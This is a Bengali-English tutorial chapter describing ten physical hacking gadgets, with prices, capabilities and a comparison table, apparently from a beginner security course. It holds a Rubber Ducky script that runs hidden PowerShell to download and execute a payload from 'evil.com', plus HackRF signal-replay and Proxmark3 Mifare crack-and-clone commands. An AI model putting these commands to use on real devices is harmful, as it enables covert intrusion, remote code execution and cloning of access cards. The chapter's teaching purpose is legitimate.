# অধ্যায় ৩০: Top 10 Hacking Gadgets

## সহজ কথায়:
Software তো জানলেই। এখন hardware gadgets — physical devices যা hack করতে সাহায্য করে। Movie-তে যা দেখো, তাই!

---

## #1: USB Rubber Ducky ($70)

- **কাজ:** ৩০ সেকেন্ডে keyboard emulation → payload execute
- **দেখতে:** Normal USB flash drive
- **কী করতে পারে:** Password dump, reverse shell, ransomware

```bash
# ডাকি script (Simple):
DELAY 1000
GUI r
DELAY 500
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).downloadString('http://evil.com/payload.ps1')"
ENTER
```

---

## #2: Flipper Zero ($200)

- **কাজ:** Multi-tool (RFID, NFC, Bluetooth, WiFi, GPIO)
- **দেখতে:** Tamagotchi-like device
- **কী করতে পারে:** 
  - RFID/NFC card clone
  - Remote control clone
  - BadUSB attack
  - Bluetooth attack
  - Sub-GHz signal capture

```bash
# Flipper Zero features:
# - 125 kHz / 13.56 MHz RFID
# - Sub-GHz (315/433/868/915 MHz)
# - NFC (Mifare, NTAG)
# - Bluetooth (BLE)
# - iButton (Dallas)
# - GPIO pins
```

---

## #3: WiFi Pineapple ($100-$200)

- **কাজ:** WiFi penetration testing (Evil Twin, MITM)
- **দেখতে:** Small router
- **কী করতে পারে:**
  - Evil Twin AP (multiple SSID)
  - MITM attack
  - Credential harvesting
  - WiFi reconnaissance

```bash
# Pineapple modules:
# - PineAP (Evil Twin setup)
# - DMG (Deauth)
# - SSLstrip
# - DNS Spoof
# - URL Sniffer
```

---

## #4: LAN Turtle ($70)

- **কাজ:** Network stealth implant
- **দেখতে:** USB Ethernet adapter
- **কী করতে পারে:**
  - Remote access (behind firewall)
  - Traffic capture
  - SSH tunnel
  - Packet injection

```bash
# Turtle modules:
# - Responder (NBT-NS poisoning)
# - dnsspoof
# - tcpdump
# - nmap
# - SSH reverse tunnel
```

---

## #5: Bash Bunny ($120)

- **কাজ:** Rubber Ducky + Ethernet + Storage combo
- **দেখতে:** USB flash drive
- **কী করতে পারে:**
  - Multiple attack modes
  - Windows / Mac / Linux attacks
  - File exfiltration
  - Network attacks

---

## #6: HackRF One ($300)

- **কাজ:** Software Defined Radio (SDR) — 1 MHz to 6 GHz
- **দেখতে:** USB TV tuner-like
- **কী করতে পারে:**
  - Radio signal capture + replay
  - GPS spoofing
  - GSM/LTE analysis
  - Key fob cloning
  - ADSB (plane tracking)

```bash
# GNU Radio + HackRF:
# Capture 433 MHz remote signal
hackrf_transfer -r remote_signal.cfile -f 433920000 -s 2000000

# Replay
hackrf_transfer -t remote_signal.cfile -f 433920000 -s 2000000
```

---

## #7: Proxmark3 ($300)

- **কাজ:** RFID/NFC read + write + clone
- **দেখতে:** Small box with antenna
- **কী করতে পারে:**
  - Mifare Classic crack (using nested attack)
  - RFID tag clone
  - HID Prox card clone
  - iClass reader/writer

```bash
# Proxmark3 commands:
# Read Mifare:
hf mf chk *1 *k mfstd.keys

# Crack:
hf mf mifare

# Clone to blank:
hf mf wrbl 4 A FFFFFFFFFFFF
```

---

## #8: O.MG Cable ($120)

- **কাজ:** Malicious charging cable — data + payload
- **দেখতে:** Normal phone charging cable
- **কী করতে পারে:**
  - Wireless payload delivery
  - Keystroke injection
  - Remote access
  - Looks completely normal!

---

## #9: Hardware Keylogger ($30-$100)

- **কাজ:** Keyboard → Computer-এর মাঝে বসে → সব keystroke capture
- **দেখতে:** Normal PS2/USB adapter
- **কী করতে পারে:**
  - All keystroke log
  - Password capture
  - Bluetooth version (send logs remotely)

---

## #10: Raspberry Pi Pentesting Kit ($50-$100)

- **কাজ:** Portable pentesting box (Kali Linux on Pi)
- **কনফিগারেশন:**
  - Raspberry Pi 4/5 (4GB+ RAM)
  - WiFi adapter (monitor mode)
  - Battery pack
  - SSD/ SD card

```bash
# Setup:
# 1. Flash Kali on SD card
# 2. Configure SSH
# 3. Connect WiFi adapter
# 4. SSH from laptop → full pentesting station!

# Pi can be hidden:
# - Behind monitor
# - Inside a book
# - As a "broken" router
```

---

## Comparison Table:

| Gadget | Price (USD) | Best For | Skill Level |
|--------|-------------|----------|-------------|
| **Rubber Ducky** | $70 | USB attack | Beginner |
| **Flipper Zero** | $200 | Multi-tool | Beginner-Int |
| **WiFi Pineapple** | $100-200 | WiFi attack | Intermediate |
| **LAN Turtle** | $70 | Network implant | Advanced |
| **Bash Bunny** | $120 | Multi-USB attack | Intermediate |
| **HackRF One** | $300 | Radio hacking | Advanced |
| **Proxmark3** | $300 | RFID hacking | Advanced |
| **O.MG Cable** | $120 | Stealth USB attack | Intermediate |
| **Keylogger HW** | $30-100 | Password theft | Beginner |
| **Raspberry Pi** | $50-100 | Custom pentest box | Intermediate |

---

## Legal Warning ⚠️

```
এই gadgets ব্যবহার করে যদি তুমি অন্যের device/system-এ
অনুমতি ছাড়া আক্রমণ করো → এটা criminal offense!

তুমি শুধু শিখো এবং নিজের lab-এ practice করো।
এই gadgets professional pentesting-এর জন্য তৈরি।
```

---

## 💡 ল্যাব এক্সারসাইজ

```
১. Budget check:
   - যদি ৫০০০ টাকা থাকে → কী কিনবে?
   - যদি ১৫০০০ টাকা থাকে → কী কিনবে?
   - যদি ৫০০০০ টাকা থাকে → কী কিনবে?

২. Research project:
   - Flipper Zero-র Bangladesh availability check করো
   - দাম কত? কোথায় পাওয়া যায়?

৩. DIY Project:
   - Raspberry Pi-তে Kali install করো (যদি Pi থাকে)
   - SSH setup → headless pentesting station
```

---

## 📌 মনে রাখো

| Gadget | Looks Like | Real Use |
|--------|-----------|----------|
| **Rubber Ducky** | USB drive | Keystroke injection |
| **Flipper Zero** | Toy | RFID + IR + GPIO |
| **WiFi Pineapple** | Router | WiFi attack |
| **LAN Turtle** | Network adapter | Network implant |
| **HackRF** | USB dongle | Radio hacking |
| **Proxmark** | Box | RFID hacking |
| **O.MG Cable** | Charging cable | Stealth attack |

**পার্ট ৮ — Android ও Mobile Security! 📱**
